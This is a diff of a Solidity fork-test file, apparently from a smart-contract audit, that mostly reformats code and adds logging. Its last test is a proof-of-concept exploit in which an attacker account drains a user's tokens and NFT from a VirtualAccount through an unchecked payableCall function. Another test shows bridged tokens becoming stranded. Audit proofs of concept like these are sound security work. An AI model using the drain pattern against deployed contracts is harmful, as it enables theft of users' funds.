@@ -3139,35 +3139,39 @@ contract RootForkTest is LzForkTest {
 
         // swithcing to chain for the test
         switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
-        
+
         // deploying new underlying tokens for testing purpose and adding it to the global chain
         console2.log("starting Test");
-        _deployUnderlyingTokenAndAddToLocalMultiple(user,numberOftokensToAdd, tokenDecimals, userBalanceForTokens);
+        _deployUnderlyingTokenAndAddToLocalMultiple(user, numberOftokensToAdd, tokenDecimals, userBalanceForTokens);
         console2.log("Test Passed!");
     }
 
-
-
-    function _deployUnderlyingTokenAndAddToLocalMultiple(address user,uint256 numberOftokensToAdd, uint8 tokenDecimals, uint256 tokenBalance ) public {
+    function _deployUnderlyingTokenAndAddToLocalMultiple(
+        address user,
+        uint256 numberOftokensToAdd,
+        uint8 tokenDecimals,
+        uint256 tokenBalance
+    ) public {
         // deploying new mutlitiple tokens
         // these tokens will be our _underlying tokens
         MockERC20[] memory _tokens = new MockERC20[](numberOftokensToAdd);
 
         console2.log("creating new underlying tokens...");
-        for(uint8 i; i<numberOftokensToAdd; i++){
-            _tokens[i] = new MockERC20(string.concat("Test Token ", vm.toString(i)), string.concat("TEST", vm.toString(i)), tokenDecimals);
+        for (uint8 i; i < numberOftokensToAdd; i++) {
+            _tokens[i] =
+            new MockERC20(string.concat("Test Token ", vm.toString(i)), string.concat("TEST", vm.toString(i)), tokenDecimals);
         }
         console2.log("successfully created new underlying tokens");
 
         // minting every created underlying token for the user
         console2.log("minting to user %s tokens for adding to root chain...", tokenBalance);
         vm.startPrank(user);
-        for(uint8 i; i<numberOftokensToAdd; i++){
+        for (uint8 i; i < numberOftokensToAdd; i++) {
             _tokens[i].mint(user, tokenBalance);
         }
         vm.stopPrank();
         console2.log("successfully minted the tokens to the user");
-        
+
         //making sure we are on correct chain
         switchToLzChain(ftmChainId);
 
@@ -3213,9 +3217,9 @@ contract RootForkTest is LzForkTest {
         console2.log("switching to Fantom chain again...");
         switchToLzChain(ftmChainId);
         // creating data for bridgeout
-        address[] memory tokenAddresses = new address[](numberOftokensToAdd); 
+        address[] memory tokenAddresses = new address[](numberOftokensToAdd);
         uint256[] memory bridgeOutAmount = new uint256[](numberOftokensToAdd);
-        for(uint8 i; i<numberOftokensToAdd; i++){
+        for (uint8 i; i < numberOftokensToAdd; i++) {
             tokenAddresses[i] = address(_tokens[i]);
             bridgeOutAmount[i] = tokenBalance;
         }
@@ -3244,15 +3248,18 @@ contract RootForkTest is LzForkTest {
         _checkBalancesAfterBridgeOut(user, tokenBalance, newGlobaltokensOnRoot);
     }
 
-    function _checkBalancesAfterBridgeOut(address user, uint256 tokenBalance, address[] memory newGlobaltokensOnRoot) internal{
+    function _checkBalancesAfterBridgeOut(address user, uint256 tokenBalance, address[] memory newGlobaltokensOnRoot)
+        internal
+    {
         uint256[] memory userBalancesOfGlobalTokens = new uint256[](newGlobaltokensOnRoot.length);
         uint256[] memory coreRootRouterBalancesOfGlobalTokens = new uint256[](newGlobaltokensOnRoot.length);
 
-        for(uint8 i; i<newGlobaltokensOnRoot.length; i++){
+        for (uint8 i; i < newGlobaltokensOnRoot.length; i++) {
             userBalancesOfGlobalTokens[i] = MockERC20(newGlobaltokensOnRoot[i]).balanceOf(user);
-            coreRootRouterBalancesOfGlobalTokens[i] = MockERC20(newGlobaltokensOnRoot[i]).balanceOf(address(coreRootRouter));
+            coreRootRouterBalancesOfGlobalTokens[i] =
+                MockERC20(newGlobaltokensOnRoot[i]).balanceOf(address(coreRootRouter));
 
-            // proof that all tokens went to core root router instead of user. There ain't a way to 
+            // proof that all tokens went to core root router instead of user. There ain't a way to
             // withdraw these tokens by the user.
             require(coreRootRouterBalancesOfGlobalTokens[i] == tokenBalance, "invalid balance");
             require(userBalancesOfGlobalTokens[i] == 0, "invalid balance");
@@ -3278,39 +3285,48 @@ contract RootForkTest is LzForkTest {
     // @audit passed
     function test_AnyoneCanCallPayableCallFunctionToTakeOutVirtualAccountFundsWithoutSendingItAnyEther() public {
         // setup
-        switchToLzChain(rootChainId);
+        console2.log("\n\tStarting the test");
         address user = makeAddr("Alice");
-        address attacker = makeAddr("Attacker");
+        address attacker = makeAddr("Bob");
         uint256 userTokenAmount = 100 ether;
 
+        console2.log("\t\t Deploying new Mock ERC20 and Mock UniswapV3NFT...");
         // deploying new ERC20 token and ERC721 NFT
         MockERC20 newToken = new MockERC20("Test token", "TEST", 18);
         // NOTE: this is very simplified version of nft. the actual Uniswap nft could be more
         // complex and might have minting and transfer condition. this is just for the testing purpose
         UniV3NFT newNFTToken = new UniV3NFT("Test NFT", "TEST");
 
+        console2.log("\t\t Alice(user) creats new Virtual Account adn mints some of the tokens...\n");
         // creating new account for the user
         VirtualAccount account = rootPort.fetchVirtualAccount(user);
 
         // checking if created account is valid
         require(account.userAddress() == user, "invalid user");
         require(account.localPortAddress() == address(rootPort), "invalid local port");
-
         // transferring some token to the user so that he can deposit in virtual account
         newToken.mint(user, userTokenAmount);
 
         vm.startPrank(user);
-        // user transfer all of his tokens to the virtual account
-        newToken.transfer(address(account), userTokenAmount);
-
         // user mint new NFT
         uint256 tokenId = newNFTToken.mint(user);
 
+        console2.log("\t\t\t > Token balance of Alice: %s", newToken.balanceOf(user));
+        console2.log("\t\t\t > Owner of NFT for tokenID[%s] = %s\n\n", tokenId, newNFTToken.ownerOf(tokenId));
+        console2.log("\t\t Alice transfers all of the tokens to virtual account\n");
+
+        // user transfer all of his tokens to the virtual account
+        newToken.transfer(address(account), userTokenAmount);
         // user transfer the new NFT to the virtual account
         newNFTToken.transferFrom(user, address(account), tokenId);
         vm.stopPrank();
 
-        // getting virtual account balance
+        console2.log("\t\t\t > Token balance of Alice: %s", newToken.balanceOf(user));
+        console2.log("\t\t\t > Token balance of VirtualAccount: %s", newToken.balanceOf(address(account)));
+        console2.log("\t\t\t > Token balance of Bob: %s", newToken.balanceOf(attacker));
+        console2.log("\t\t\t > Owner of NFT for tokenID[%s] = %s\n\n", tokenId, newNFTToken.ownerOf(tokenId));
+
+        // getting balances
         uint256 virtualAccountBalance = MockERC20(newToken).balanceOf(address(account));
         uint256 userBalance = MockERC20(newToken).balanceOf(user);
 
@@ -3319,15 +3335,21 @@ contract RootForkTest is LzForkTest {
         require(userBalance == 0, "invalid balance of user");
 
         // attakcer sees that the virtual account has balance start preparing call data
+        console2.log("\t\t Bob calls payableCall() to transfer tokens to his account\n");
+
+        // getting balances before the transfer
+        uint256 attackerBalanceBefore = newToken.balanceOf(attacker);
+        uint256 virtualAccountBalanceBefore = newToken.balanceOf(address(account));
+
         vm.startPrank(attacker);
         PayableCall[] memory calls = new PayableCall[](2);
 
-        // attacker use payableCall function to approve himself for the tokens by the virtual account
+        // attacker use payableCall function to transfer himself all of the tokens in the alice's virtual account
         // also he didn't need to transfer any ether to the virtual account as the function didn't
         // check that as well
         calls[0] = PayableCall({
             target: address(newToken),
-            callData: abi.encodeWithSelector(ERC20.approve.selector, attacker, userTokenAmount),
+            callData: abi.encodeWithSelector(ERC20.transfer.selector, attacker, userTokenAmount),
             value: 0
         });
 
@@ -3341,12 +3363,11 @@ contract RootForkTest is LzForkTest {
         // performing call
         VirtualAccount(payable(address(account))).payableCall(calls);
 
-        // getting balances before the transfer
-        uint256 attackerBalanceBefore = newToken.balanceOf(attacker);
-        uint256 virtualAccountBalanceBefore = newToken.balanceOf(address(account));
+        console2.log("\t\t\t > Token balance of Alice: %s", newToken.balanceOf(user));
+        console2.log("\t\t\t > Token balance of Bob: %s", newToken.balanceOf(attacker));
+        console2.log("\t\t\t > Token balance of virtual account: %s", newToken.balanceOf(address(account)));
+        console2.log("\t\t\t > Owner of NFT for tokenID[%s] = %s\nnn", tokenId, newNFTToken.ownerOf(tokenId));
 
-        // attacker transfer token to himself leaving virtual account empty
-        newToken.transferFrom(address(account), attacker, userTokenAmount);
         vm.stopPrank();
 
         // getting balances after the transfer
@@ -3365,6 +3386,7 @@ contract RootForkTest is LzForkTest {
         // virtual account should not have anything after the transfer
         require(virtualAccountBalanceAfter == 0, "I still got the amount");
         require(newNFTToken.ownerOf(tokenId) == attacker, "No you are not");
+        console2.log("\tTest passed successfully");
     }
 }
 
